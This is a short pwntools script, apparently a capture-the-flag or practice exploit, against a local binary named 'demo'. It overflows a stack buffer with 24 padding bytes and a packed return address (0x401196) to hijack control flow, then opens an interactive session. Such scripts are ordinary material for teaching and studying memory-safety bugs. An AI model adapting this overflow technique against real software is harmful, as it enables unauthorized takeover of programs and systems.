#!/usr/bin/env python
# coding=utf-8
from pwn import *
r = process('./demo')
r.recvuntil('input your name:')
targer_address = p64(0x401196)
r.sendline(b'A' * 24 + targer_address)
r.interactive()